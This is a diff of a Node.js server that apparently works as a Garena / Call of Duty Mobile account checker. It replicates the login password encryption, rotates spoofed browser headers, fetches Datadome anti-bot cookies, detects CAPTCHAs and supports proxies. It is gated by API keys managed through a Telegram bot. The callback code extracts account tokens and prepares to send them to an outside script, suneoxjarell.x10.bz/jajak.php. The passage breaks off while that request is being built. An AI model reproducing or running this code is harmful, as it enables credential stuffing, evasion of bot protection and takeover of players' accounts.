@@ -1,28 +1,38 @@
-// server.js
-require('dotenv').config(); // Load environment variables from .env file
-const os = require('os');
-const fs = require('fs');
+// --- Core Node.js Modules ---
+const fs = require('fs').promises;
 const path = require('path');
 const crypto = require('crypto');
+const { URL, URLSearchParams } = require('url'); // Import URLSearchParams
+
+// --- Dependencies ---
+require('dotenv').config(); // Load .env variables
 const express = require('express');
 const axios = require('axios');
+const { CookieJar } = require('tough-cookie');
+const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
 const winston = require('winston');
-const stripAnsi = require('strip-ansi');
-const _ = require('lodash'); // For HTML escaping
+const TelegramBot = require('node-telegram-bot-api');
+const he = require('he'); // HTML entities
 
 // --- Configuration ---
 const LOG_DIR = "logs";
-const FORWARD_POST_URL = process.env.FORWARD_POST_URL || null;
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_ADMIN_USER_ID = process.env.TELEGRAM_ADMIN_USER_ID;
-// Default FORWARD_CHAT_ID to admin ID if available, otherwise null
-const FORWARD_CHAT_ID = process.env.FORWARD_CHAT_ID || (TELEGRAM_BOT_TOKEN ? TELEGRAM_ADMIN_USER_ID : null);
-const PORT = process.env.PORT || 5000;
+const API_KEY_FILE = "api_keys.txt"; // API Keys managed via file and bot
 
-const APK_URL = "https://auth.garena.com/api/login?"; // Base URL, params added later
+// --- Telegram Bot Config ---
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_ADMIN_USER_ID = parseInt(process.env.TELEGRAM_ADMIN_USER_ID || '0', 10);
+
+// --- Garena/CODM Constants ---
+const APK_URL = "https://auth.garena.com/api/login?";
 const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";
-const EXTERNAL_SCRIPT_URL = "https://suneoxjarell.x10.bz/jajak.php";
-const EXPECTED_OWNER = "t.me/yishux";
+const EXTERNAL_SCRIPT_URL = process.env.EXTERNAL_SCRIPT_URL || "https://suneoxjarell.x10.bz/jajak.php"; // External dependency
+
+// --- Script Owner Information ---
+// Script Owner: YISHUX (S1N) - Please respect the original author.
+// TG: @YISHUX
+// Unauthorized copying, modification, or distribution is discouraged.
+const OWNER_TAG = "YISHUX (S1N)";
+const CHECKER_BY_TAG = "YISHUX - TG: @YISHUX";
 
 const USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -32,62 +42,75 @@ const USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
 ];
 
-// In-memory queue for forwarding
-const forwardQueue = [];
+// --- Global Variables & Setup ---
+let apiKeys = new Set();
+let bot = null; // Telegram Bot instance
 
 // --- Logging Setup ---
-fs.existsSync(LOG_DIR) || fs.mkdirSync(LOG_DIR);
-const logFile = path.join(LOG_DIR, `api_checker_run_${Math.floor(Date.now() / 1000)}.log`);
+(async () => {
+    try {
+        await fs.mkdir(LOG_DIR, { recursive: true });
+    } catch (err) {
+        console.error("Error creating log directory:", err);
+    }
+})();
 
+const logFile = path.join(LOG_DIR, `api_checker_run_${Date.now()}.log`);
 const logger = winston.createLogger({
-    level: 'info', // Set default level
+    level: process.env.NODE_ENV === 'development' ? 'debug' : 'info',
     format: winston.format.combine(
-        winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss.SSS' }),
-        winston.format.printf(({ timestamp, level, message, ...meta }) => {
-            // Simple format similar to the Python one
-            let metaString = '';
-            if (meta && Object.keys(meta).length > 0) {
-                 // Attempt to mimic the Python format slightly if function/line info is passed
-                 if (meta.function && meta.line) {
-                     metaString = ` [${meta.function}:${meta.line}]`;
-                 } else {
-                     // Fallback for general metadata
-                     // metaString = ` ${JSON.stringify(meta)}`; // Avoid stringifying large objects
-                 }
-            }
-            // Use default node process/thread info if available
-            const threadInfo = `[pid:${process.pid}]`; // Node doesn't have Python's threadName easily accessible here
-
-            return `${timestamp} - ${level.toUpperCase()} - ${threadInfo}${metaString} - ${message}`;
-        })
+        winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
+        winston.format.printf(info => `${info.timestamp} - ${info.level.toUpperCase()} - [${info.label || 'main'}:${info.lineNumber || '?'}] - ${info.message}`)
     ),
     transports: [
-        new winston.transports.File({ filename: logFile, level: 'debug', options: { flags: 'a' }, encoding: 'utf8' }),
-        new winston.transports.Console({ level: 'info' }) // Console logs at info level
+        new winston.transports.File({ filename: logFile, encoding: 'utf8' }),
+        new winston.transports.Console({
+            format: winston.format.combine(
+                winston.format.colorize(),
+                winston.format.printf(info => `${info.timestamp} - ${info.level} - [${info.label || 'main'}:${info.lineNumber || '?'}] - ${info.message}`)
+            )
+        }),
     ],
-    // Do not exit on handled exceptions
-    // exitOnError: false, // Default is true, might want false for long-running server
 });
 
-// Silence axios/other library debug logs if needed (less direct than Python's approach)
-// You might need more specific filtering if other libraries are too noisy at 'debug' level.
+// Helper to get line number for logs (approximation)
+function getLineNumber() {
+    try {
+        throw new Error();
+    } catch (e) {
+        try {
+            // Adjust the index based on call stack depth
+            const line = e.stack.split('\n')[3]; // May need adjustment
+            const match = line.match(/(\d+):\d+\)?$/);
+            return match ? match[1] : '?';
+        } catch {
+            return '?';
+        }
+    }
+}
+const log = {
+    info: (message, label = 'main') => logger.info(message, { label, lineNumber: getLineNumber() }),
+    warn: (message, label = 'main') => logger.warn(message, { label, lineNumber: getLineNumber() }),
+    error: (message, label = 'main') => logger.error(message, { label, lineNumber: getLineNumber() }),
+    debug: (message, label = 'main') => logger.debug(message, { label, lineNumber: getLineNumber() }),
+};
 
 // --- Utility Functions ---
-
 function stripAnsiCodes(text) {
     if (typeof text !== 'string') {
         return text;
     }
-    try {
-        return stripAnsi(text);
-    } catch (e) {
-        // Fallback regex might be less robust than the dedicated library
-        return text.replace(/\x1B\[[0-?]*[ -/]*[@-~]/g, '').replace(/\x1B\[[0-?]*m/g, '');
-    }
+    // Standard ANSI escape sequences
+    const ansiEscape = /\x1B\[[0-?]*[ -/]*[@-~]/g;
+    // Simpler color codes like \x1b[31m
+    const simpleColorEscape = /\x1b\[\d+m/g;
+    let cleaned = text.replace(ansiEscape, '');
+    cleaned = cleaned.replace(simpleColorEscape, '');
+    return cleaned;
 }
 
 function getCurrentTimestamp() {
-    return String(Math.floor(Date.now() / 1000));
+    return Math.floor(Date.now() / 1000).toString();
 }
 
 function generateMd5Hash(password) {
@@ -101,27 +124,23 @@ function generateDecryptionKey(passwordMd5, v1, v2) {
 
 function encryptAes256Ecb(plaintextHex, keyHex) {
     try {
-        const keyBytes = Buffer.from(keyHex, 'hex');
-        if (keyBytes.length !== 32) {
-            throw new Error(`AES key must be 32 bytes (256 bits), got ${keyBytes.length}`);
+        const key = Buffer.from(keyHex, 'hex');
+        if (key.length !== 32) {
+            throw new Error(`AES key must be 32 bytes (256 bits), got ${key.length}`);
         }
-        // For ECB mode in Node's crypto, the IV is ignored or should be null/empty buffer
-        const cipher = crypto.createCipheriv('aes-256-ecb', keyBytes, null);
-        cipher.setAutoPadding(false); // Disable auto-padding to replicate Python's manual padding
+        const plaintext = Buffer.from(plaintextHex, 'hex');
 
-        const plaintextBytes = Buffer.from(plaintextHex, 'hex');
-        const blockSize = 16;
-        const paddingLength = blockSize - (plaintextBytes.length % blockSize);
-        const paddingBuffer = Buffer.alloc(paddingLength, paddingLength); // Create buffer filled with paddingLength value
-        const paddedPlaintext = Buffer.concat([plaintextBytes, paddingBuffer]);
+        // Node's 'aes-256-ecb' uses PKCS7 padding by default, which matches the Python manual padding
+        const cipher = crypto.createCipheriv('aes-256-ecb', key, null); // No IV for ECB
 
-        let encrypted = cipher.update(paddedPlaintext, null, 'hex'); // Input is buffer, output hex
-        encrypted += cipher.final('hex');
+        let encrypted = cipher.update(plaintext);
+        encrypted = Buffer.concat([encrypted, cipher.final()]);
 
-        return encrypted.substring(0, 32); // Match Python's slicing
+        // Return the first 32 hex characters (16 bytes) as per the original script
+        return encrypted.toString('hex').slice(0, 32);
     } catch (error) {
-        logger.error(`AES Encryption Error: ${error.message}. PlaintextHex: ${plaintextHex.substring(0, 10)}..., KeyHex: ${keyHex.substring(0, 10)}...`);
-        throw error; // Re-throw after logging
+        log.error(`AES Encryption Error: ${error.message}. Plaintext(hex): ${plaintextHex.slice(0, 10)}..., Key(hex): ${keyHex.slice(0, 10)}...`, 'encryptAes256Ecb');
+        throw error; // Re-throw to be caught by caller
     }
 }
 
@@ -134,659 +153,635 @@ function getEncryptedPassword(password, v1, v2) {
 
 function getRandomUserAgentData() {
     const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
-    let secChUa = "";
-    let platformName = "Windows"; // Default
+    let sec_ch_ua = "";
+    let platform_name = "Windows";
 
-    if (ua.includes("Chrome/")) {
+    if (ua.includes("Chrome")) {
         const match = ua.match(/Chrome\/(\d+)/);
-        const version = match ? match[1] : "120"; // Fallback version
-        secChUa = `"Google Chrome";v="${version}", "Not)A;Brand";v="8", "Chromium";v="${version}"`;
+        const version = match ? match[1] : "120";
+        sec_ch_ua = `"Google Chrome";v="${version}", "Not)A;Brand";v="8", "Chromium";v="${version}"`;
+    } else if (ua.includes("Macintosh") || ua.includes("Mac OS X")) {
+        platform_name = "macOS";
+    } else if (ua.includes("Firefox")) {
+         const match = ua.match(/Firefox\/(\d+)/);
+         const version = match ? match[1] : "119";
+         // Firefox doesn't typically send sec-ch-ua in the same way
+         sec_ch_ua = `"Firefox";v="${version}"`; // Simplified example
+         platform_name = ua.includes("Windows") ? "Windows" : (ua.includes("Mac") ? "macOS" : "Linux"); // Guess platform
+    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+         const match = ua.match(/Version\/(\d+)/);
+         const version = match ? match[1] : "17";
+         sec_ch_ua = `"Safari";v="${version}"`; // Simplified example
+         platform_name = "macOS"; // Assuming Safari runs on Mac
     }
-    if (ua.includes("Macintosh") || ua.includes("Mac OS X")) {
-        platformName = "macOS";
-    }
-     // Firefox, Safari etc. don't typically send sec-ch-ua in the same way by default
+    // Add more specific sec-ch-ua logic if needed
 
-    return { userAgent: ua, secChUa, platformName };
+    return { userAgent: ua, secChUa: sec_ch_ua, platformName: platform_name };
 }
 
 function detectCaptchaInResponse(responseText) {
     return typeof responseText === 'string' && responseText.toLowerCase().includes("captcha");
 }
 
-// --- Cookie Parsing Helper ---
-// Basic cookie parser from Set-Cookie headers
-function parseCookies(setCookieHeaders) {
-    const cookies = {};
-    if (!setCookieHeaders) return cookies;
-    const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
-    headers.forEach(header => {
-        const parts = header.split(';');
-        if (parts.length > 0) {
-            const cookiePair = parts[0].split('=');
-            if (cookiePair.length === 2) {
-                const key = cookiePair[0].trim();
-                const value = cookiePair[1].trim();
-                if (key && value) { // Ensure key and value are not empty
-                     cookies[key] = value;
-                }
-            }
+// --- API Key Management ---
+// Using a simple mutex-like flag for file operations to avoid race conditions
+let isSavingKeys = false;
+let isloadingKeys = false;
+
+async function loadApiKeys() {
+    if (isloadingKeys) {
+        log.warn("Load API keys already in progress, skipping.", "loadApiKeys");
+        return;
+    }
+    isloadingKeys = true;
+    log.debug("Attempting to load API keys...", "loadApiKeys");
+    try {
+        if (!await fs.access(API_KEY_FILE).then(() => true).catch(() => false)) {
+            log.warn(`${API_KEY_FILE} not found. Creating empty file.`, "loadApiKeys");
+            await fs.writeFile(API_KEY_FILE, '', 'utf-8');
         }
-    });
-    return cookies;
+        const data = await fs.readFile(API_KEY_FILE, 'utf-8');
+        const keys = data.split('\n')
+            .map(line => line.trim())
+            .filter(line => line && !line.startsWith('#'));
+        apiKeys = new Set(keys);
+        log.info(`Loaded ${apiKeys.size} API keys from ${API_KEY_FILE}.`, "loadApiKeys");
+    } catch (err) {
+        log.error(`Failed to load API keys from ${API_KEY_FILE}: ${err}`, "loadApiKeys");
+    } finally {
+        isloadingKeys = false;
+    }
 }
 
-// Format cookies object into a string for the 'Cookie' header
-function formatCookiesForHeader(cookies) {
-    return Object.entries(cookies)
-        .map(([key, value]) => `${key}=${value}`)
-        .join('; ');
+async function saveApiKeys() {
+    if (isSavingKeys) {
+        log.warn("Save API keys already in progress, skipping.", "saveApiKeys");
+        return false;
+    }
+    isSavingKeys = true;
+    log.debug(`Attempting to save ${apiKeys.size} keys...`, "saveApiKeys");
+    try {
+        const header = `# API Keys for CODM Checker - Managed by Telegram Bot\n# Owner: ${OWNER_TAG}\n`;
+        const data = header + Array.from(apiKeys).sort().join('\n') + '\n';
+        await fs.writeFile(API_KEY_FILE, data, 'utf-8');
+        log.info(`Saved ${apiKeys.size} API keys to ${API_KEY_FILE}.`, "saveApiKeys");
+        return true;
+    } catch (err) {
+        log.error(`Failed to save API keys to ${API_KEY_FILE}: ${err}`, "saveApiKeys");
+        return false;
+    } finally {
+        isSavingKeys = false;
+    }
 }
 
+// --- Core Checking Logic ---
 
-// --- Core Logic Functions ---
-
-async function getRequestData() {
-    // Cookies are managed per request flow, start empty here
-    const finalCookies = {};
+function getRequestData() {
+    // Creates fresh headers for each request sequence
     const { userAgent, secChUa, platformName } = getRandomUserAgentData();
-    logger.debug(`Using UA: ${userAgent}, Platform: ${platformName}`);
+    log.debug(`Using UA: ${userAgent}, Platform: ${platformName}`, 'getRequestData');
 
     const headers = {
         'Host': 'auth.garena.com',
         'Connection': 'keep-alive',
-        // Only add sec-ch-ua headers if they exist (Chrome/Edge)
-        ...(secChUa && { 'sec-ch-ua': secChUa }),
+        'sec-ch-ua': secChUa,
         'sec-ch-ua-mobile': '?0',
         'User-Agent': userAgent,
-        ...(platformName && { 'sec-ch-ua-platform': `"${platformName}"` }),
+        'sec-ch-ua-platform': `"${platformName}"`,
         'Accept': 'application/json, text/plain, */*',
         'Sec-Fetch-Site': 'same-origin',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Dest': 'empty',
-        'Referer': `https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=${encodeURIComponent(REDIRECT_URL)}`,
-        'Accept-Encoding': 'gzip, deflate, br, zstd', // Axios handles this automatically
+        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + encodeURIComponent(REDIRECT_URL),
+        'Accept-Encoding': 'gzip, deflate, br, zstd',
         'Accept-Language': 'en-US,en;q=0.9'
     };
-    return { finalCookies, headers };
+    return headers; // Only headers needed now, cookies handled by jar
 }
 
-async function getDatadomeCookie(proxies = null) { // Note: proxies not implemented in axios setup here
+async function getDatadomeCookie(axiosInstance, proxies = null) {
     const url = 'https://dd.garena.com/js/';
     const { userAgent, secChUa, platformName } = getRandomUserAgentData();
     const headers = {
         'accept': '*/*',
-        // 'accept-encoding': 'gzip, deflate, br, zstd', // Axios handles this
+        'accept-encoding': 'gzip, deflate, br, zstd',
         'accept-language': 'en-US,en;q=0.9',
         'cache-control': 'no-cache',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://account.garena.com',
         'pragma': 'no-cache',
         'referer': 'https://account.garena.com/',
-        ...(secChUa && { 'sec-ch-ua': secChUa }),
+        'sec-ch-ua': secChUa,
         'sec-ch-ua-mobile': '?0',
-        ...(platformName && { 'sec-ch-ua-platform': `"${platformName}"` }),
+        'sec-ch-ua-platform': `"${platformName}"`,
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-site',
         'user-agent': userAgent
     };
-
     const payload = {
-        'jsData': JSON.stringify({"ttst": _.random(50, 150), "br_oh":1080, "br_ow":1920}),
-        'eventCounters': '[]',
-        'jsType': 'ch',
-        'ddv': '4.35.4',
-        'Referer': 'https://account.garena.com/',
-        'request': '%2F', // Encoded '/'
-        'responsePage': 'origin',
+        jsData: JSON.stringify({ "ttst": Math.floor(Math.random() * 100) + 50, "br_oh": 1080, "br_ow": 1920 }),
+        eventCounters: '[]',
+        jsType: 'ch',
+        ddv: '4.35.4', // Keep version consistent or update if needed
+        Referer: 'https://account.garena.com/',
+        request: '%2F', // URL encoded '/'
+        responsePage: 'origin',
     };
-    // Use URLSearchParams for proper encoding of form data
-    const data = new URLSearchParams(payload).toString();
-    // const data = Object.entries(payload).map(([k, v]) => `${k}=${encodeURIComponent(String(v))}`).join('&'); // Manual alternative
+    const data = new URLSearchParams(payload).toString(); // Use URLSearchParams for correct encoding
+    const config = {
+        headers: headers,
+        timeout: 15000,
+        proxy: proxies ? proxies : false // Axios proxy format { protocol: 'http', host: '...', port: ... }
+    };
 
     try {
-        const response = await axios.post(url, data, {
-            headers: headers,
-            timeout: 15000, // 15 seconds
-             // proxy: proxies ? { host: proxyHost, port: proxyPort } : false // Basic proxy setup if needed
-            validateStatus: status => status >= 200 && status < 500 // Allow 4xx errors for inspection
-        });
-
-        const responseTextClean = stripAnsiCodes(response.data ? JSON.stringify(response.data) : ''); // Axios usually parses JSON
+        log.debug("Requesting Datadome cookie...", "getDatadomeCookie");
+        const response = await axiosInstance.post(url, data, config);
+        const responseTextClean = stripAnsiCodes(JSON.stringify(response.data)); // Check JSON data
 
         if (detectCaptchaInResponse(responseTextClean)) {
-            logger.warn(`CAPTCHA detected in Datadome response body: ${responseTextClean.substring(0, 200)}`);
+            log.warn(`CAPTCHA detected in Datadome response body: ${responseTextClean.slice(0, 200)}`, "getDatadomeCookie");
             return "[API_ERROR] CAPTCHA Detected (Datadome Response Body)";
         }
-         if (response.status >= 400) {
-            logger.warn(`Datadome request failed with status ${response.status}: ${responseTextClean.substring(0, 200)}`);
-             // Check for captcha again in error response
-            if (detectCaptchaInResponse(responseTextClean)) {
-                 return "[API_ERROR] CAPTCHA Detected (Datadome HTTP Error)";
-            }
-             return `[API_ERROR] Datadome Request Failed (${response.status})`;
-        }
 
-
-        const responseJson = response.data; // Already parsed by axios
-
-        if (typeof responseJson !== 'object' || responseJson === null) {
-             logger.warn(`Datadome response was not valid JSON: ${responseTextClean.substring(0, 200)}`);
-             return "[API_ERROR] Datadome Invalid JSON";
-        }
-
-        // Check JSON content for captcha hints
-        if (detectCaptchaInResponse(JSON.stringify(responseJson))) {
-            logger.warn(`CAPTCHA detected in Datadome JSON response: ${JSON.stringify(responseJson).substring(0, 200)}`);
-            return "[API_ERROR] CAPTCHA Detected (Datadome JSON)";
-        }
-
-
-        if (responseJson.cookie) {
-            const cookieString = responseJson.cookie;
+        if (response.data && typeof response.data === 'object' && 'cookie' in response.data) {
+            const cookieString = response.data.cookie;
             const match = cookieString.match(/datadome=([^;]+)/);
             if (match && match[1]) {
-                logger.debug("Successfully fetched Datadome cookie.");
-                return match[1];
+                log.debug("Successfully fetched Datadome cookie.", "getDatadomeCookie");
+                return match[1]; // Return the cookie value
             }
         }
 
-        logger.warn(`Datadome response missing expected cookie: ${JSON.stringify(responseJson).substring(0, 200)}`);
-        return null; // Indicate missing cookie, but not necessarily a hard error yet
+        log.warn(`Datadome response missing expected cookie: ${JSON.stringify(response.data)}`, "getDatadomeCookie");
+        return "[API_ERROR] Datadome response missing cookie"; // Return specific error
 
     } catch (error) {
         const errorStr = stripAnsiCodes(error.toString());
-        const respText = error.response ? stripAnsiCodes(JSON.stringify(error.response.data)) : "";
-        const status = error.response ? error.response.status : "N/A";
-
+        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
         if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
-            logger.warn(`CAPTCHA detected during Datadome request/parse error: ${errorStr} / ${respText.substring(0, 100)}`);
+            log.warn(`CAPTCHA detected during Datadome request/parse error: ${errorStr} / ${respText.slice(0, 100)}`, "getDatadomeCookie");
             return "[API_ERROR] CAPTCHA Detected (Datadome Request/Parse Error)";
         }
-         if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
-            logger.error(`Datadome request timed out: ${errorStr}`);
-            return "[API_ERROR][Timeout] Datadome Request Timeout";
+        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
+            log.error("Datadome request timed out.", "getDatadomeCookie");
+            return "[API_ERROR][Timeout] Datadome Timeout";
         }
-        logger.error(`Failed to get Datadome cookie: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,150)}`);
-        return `[API_ERROR] Datadome Request Error: ${errorStr.substring(0, 100)}`;
+        log.error(`Failed to get Datadome cookie: ${errorStr}`, "getDatadomeCookie");
+        return `[API_ERROR] Datadome Request Error: ${errorStr.slice(0, 100)}`;
     }
 }
 
-async function show_level(accessToken, selectedHeader, cookiesForCodm, proxies = null) {
+async function showLevel(accessToken, baseHeaders, axiosInstance, proxies = null) {
     const callbackBaseUrl = "https://auth.codm.garena.com/auth/auth/callback_n";
-    const callbackParams = { site: "https://api-delete-request.codm.garena.co.id/oauth/callback/", access_token: accessToken };
-
-    const baseHeaders = {
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", // More standard browser accept
-        // "Accept-Encoding": "gzip, deflate, br", // Axios handles
+    const callbackParams = {
+        site: "https://api-delete-request.codm.garena.co.id/oauth/callback/",
+        access_token: accessToken
+    };
+    const headers = {
+        ...baseHeaders, // Include base UA, sec-ch-ua etc.
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", // More browser-like accept
+        "Accept-Encoding": "gzip, deflate, br, zstd",
         "Accept-Language": "en-US,en;q=0.9",
         "Referer": "https://auth.garena.com/",
         "Sec-Fetch-Dest": "document",
         "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "same-site", // Changed from same-origin based on redirect context
+        "Sec-Fetch-Site": "same-site", // Note: Can change during redirects
         "Upgrade-Insecure-Requests": "1",
-        "User-Agent": selectedHeader['User-Agent'] || "Mozilla/5.0", // Use provided UA
     };
-    // Add sec-ch-ua headers if present in selectedHeader
-    Object.keys(selectedHeader).forEach(key => {
-        if (key.toLowerCase().startsWith('sec-ch-ua')) {
-            baseHeaders[key] = selectedHeader[key];
-        }
-    });
 
-    let currentCookies = { ...cookiesForCodm }; // Start with passed cookies
-    let extractedToken = null;
     let currentUrl = callbackBaseUrl;
-    let currentParams = new URLSearchParams(callbackParams).toString(); // Start with params
+    let currentParams = callbackParams;
     let redirectCount = 0;
     const maxRedirects = 7;
+    let extractedToken = null;
 
     try {
         while (redirectCount < maxRedirects) {
-            const requestUrl = currentParams ? `${currentUrl}?${currentParams}` : currentUrl;
-            logger.debug(`CODM Callback Request ${redirectCount + 1}: URL=${requestUrl.substring(0, 100)}`);
+            log.debug(`CODM Callback Request ${redirectCount + 1}: URL=${currentUrl.slice(0, 100)}, Params=${currentParams ? 'Yes' : 'No'}`, 'showLevel');
 
-            const response = await axios.get(requestUrl, {
-                headers: {
-                    ...baseHeaders, // Include base headers
-                    'Cookie': formatCookiesForHeader(currentCookies) // Send current cookies
-                },
-                timeout: 30000, // 30 seconds
+            const config = {
+                headers: headers,
+                params: currentParams,
+                timeout: 30000,
                 maxRedirects: 0, // Handle redirects manually
-                validateStatus: status => status >= 200 && status < 400, // Allow 3xx redirects
-                 // proxy: proxies ? { host: proxyHost, port: proxyPort } : false
-            });
+                validateStatus: status => status < 500, // Accept 3xx, 4xx as non-errors for manual handling
+                proxy: proxies ? proxies : false,
+                // The cookie jar on axiosInstance should handle cookies automatically
+            };
 
-            const responseTextClean = stripAnsiCodes(typeof response.data === 'string' ? response.data : JSON.stringify(response.data));
-            const newCookies = parseCookies(response.headers['set-cookie']);
-            currentCookies = { ...currentCookies, ...newCookies }; // Merge cookies
+            let response;
+            try {
+                response = await axiosInstance.get(currentUrl, config);
+            } catch (axiosError) {
+                // Errors not covered by validateStatus (network, timeout, >=500)
+                 if (axiosError.code === 'ETIMEDOUT' || axiosError.code === 'ECONNABORTED') {
+                    log.error("CODM callback request timed out.", 'showLevel');
+                    return "[API_ERROR][Timeout] CODM callback request timed out.";
+                }
+                 log.error(`CODM callback request failed: ${axiosError}`, 'showLevel');
+                 return `[CODM_FAIL] Callback request failed: ${stripAnsiCodes(axiosError.message).slice(0, 100)}`;
+            }
 
-            logger.debug(`CODM Callback Response ${redirectCount + 1}: Status=${response.status}, Size=${responseTextClean.length}, Cookies updated: ${Object.keys(newCookies).join(', ')}`);
-
+            const responseTextClean = stripAnsiCodes(response.data ? response.data.toString() : ""); // response.data might be buffer
+            log.debug(`CODM Callback Response ${redirectCount + 1}: Status=${response.status}, Size=${responseTextClean.length}`, 'showLevel');
 
             if (detectCaptchaInResponse(responseTextClean)) {
-                logger.warn(`CAPTCHA detected in CODM callback body (URL: ${currentUrl.substring(0, 100)}...)`);
+                log.warn(`CAPTCHA detected in CODM callback body (URL: ${currentUrl.slice(0, 100)}...) Status: ${response.status}`, 'showLevel');
                 return "[API_ERROR] CAPTCHA Detected (CODM Callback/Redirect Body)";
             }
-             // Note: We set validateStatus, so 4xx/5xx errors land in the catch block
+            // Update Sec-Fetch-Site for subsequent requests if redirected cross-site
+            const currentHost = new URL(currentUrl).hostname;
 
-            if (response.status >= 300 && response.status < 400) { // Handle Redirects (301, 302, 307, 308)
+
+            if ([301, 302, 307, 308].includes(response.status)) {
                 const redirectUrl = response.headers['location'];
                 if (!redirectUrl) {
-                    logger.error("CODM Redirect detected but no Location header.");
+                    log.error("CODM Redirect detected but no Location header.", 'showLevel');
                     return "[CODM_FAIL] Redirect detected but no Location header.";
                 }
-                // Resolve relative URLs correctly
-                const previousUrlObj = new URL(currentUrl);
-                const nextUrlObj = new URL(redirectUrl, previousUrlObj.origin + previousUrlObj.pathname); // Use base for relative paths
-                currentUrl = nextUrlObj.toString();
-                currentParams = null; // Params are usually lost on redirect unless explicitly in the Location URL
+                const previousUrl = currentUrl;
+                currentUrl = new URL(redirectUrl, currentUrl).toString(); // Resolve relative URLs
+                currentParams = null; // Params usually only for the first request
                 redirectCount++;
-                logger.debug(`Following redirect ${redirectCount} to: ${currentUrl.substring(0, 100)}...`);
+
+                // Update referer and fetch site for the next request
+                headers['Referer'] = previousUrl;
+                const nextHost = new URL(currentUrl).hostname;
+                if (currentHost !== nextHost) {
+                    headers['Sec-Fetch-Site'] = 'cross-site';
+                } else {
+                     headers['Sec-Fetch-Site'] = 'same-origin'; // Or keep as same-site if appropriate
+                }
+
+
+                log.debug(`Following redirect ${redirectCount} to: ${currentUrl.slice(0, 100)}...`, 'showLevel');
                 await new Promise(resolve => setTimeout(resolve, 200)); // Small delay
-            } else { // Should be a 2xx response now
-                 logger.debug(`CODM Callback landed on: ${response.config.url.substring(0, 100)}...`); // Log the final URL requested
-                 const finalUrl = response.request.res.responseUrl || response.config.url; // Try to get the final URL after internal handling if any
+            } else if (response.status >= 200 && response.status < 300) {
+                // Success, landed on final page
+                const finalUrl = response.request?.res?.responseUrl || currentUrl; // Get final URL after potential internal redirects axios might handle
+                log.debug(`CODM Callback landed on: ${finalUrl.slice(0, 100)}...`, 'showLevel');
+                const parsedFinalUrl = new URL(finalUrl);
+                extractedToken = parsedFinalUrl.searchParams.get("token");
 
-                 // Try extracting token from URL query params first
-                 try {
-                    const finalUrlObj = new URL(finalUrl);
-                    extractedToken = finalUrlObj.searchParams.get("token");
-                 } catch (urlParseError) {
-                    logger.warn(`Could not parse final URL: ${finalUrl} - ${urlParseError.message}`)
-                 }
-
-
-                 // If not in URL, try regex on body
-                 if (!extractedToken) {
-                     const tokenMatch = responseTextClean.match(/["']token["']\s*:\s*["']([\w\-.]+)["']/);
-                     if (tokenMatch && tokenMatch[1]) {
-                         extractedToken = tokenMatch[1];
-                     }
-                 }
+                if (!extractedToken) { // Fallback: try regex on body
+                    const match = responseTextClean.match(/["']token["']\s*:\s*["']([\w\-.]+)["']/);
+                    if (match) extractedToken = match[1];
+                }
 
                 if (!extractedToken) {
-                    logger.warn(`CODM Token Extraction Failed. Final URL: ${finalUrl}, Status: ${response.status}, Body Snippet: ${responseTextClean.substring(0, 200)}`);
+                    log.warn(`CODM Token Extraction Failed. Final URL: ${finalUrl}, Status: ${response.status}, Body Snippet: ${responseTextClean.slice(0, 200)}`, 'showLevel');
                     return "[CODM_FAIL] Could not extract CODM token from callback.";
                 }
-                logger.debug(`Extracted CODM token: ${extractedToken.substring(0, 10)}...`);
-                break; // Token found, exit loop
+                log.debug(`Extracted CODM token: ${extractedToken.slice(0, 10)}...`, 'showLevel');
+                break; // Exit redirect loop
+            } else {
+                 // Handle unexpected status codes (e.g., 4xx errors not caught as CAPTCHA)
+                 log.error(`CODM Callback unexpected status ${response.status}. URL: ${currentUrl}. Body: ${responseTextClean.slice(0,200)}`, 'showLevel');
+                 return `[CODM_FAIL] Callback unexpected status ${response.status}`;
             }
         } // End while loop
 
         if (redirectCount >= maxRedirects) {
-            logger.error("Maximum redirects reached during CODM callback.");
+            log.error("Maximum redirects reached during CODM callback.", 'showLevel');
             return "[CODM_FAIL] Maximum redirects reached during CODM callback.";
         }
 
-        // --- Call External CODM Script ---
+        if (!extractedToken) {
+             log.error("Exited redirect loop but no CODM token was extracted.", 'showLevel');
+             return "[CODM_FAIL] Failed to extract CODM token after redirects.";
+        }
+
+        // --- Call the external script (jajak.php) ---
         const payloadForScript = {
-            "user_agent": selectedHeader['User-Agent'],
-            "extracted_token": extractedToken
+            user_agent: headers['User-Agent'], // Send the UA used in the flow
+            extracted_token: extractedToken
         };
         const scriptHeaders = {
             "Content-Type": "application/json",
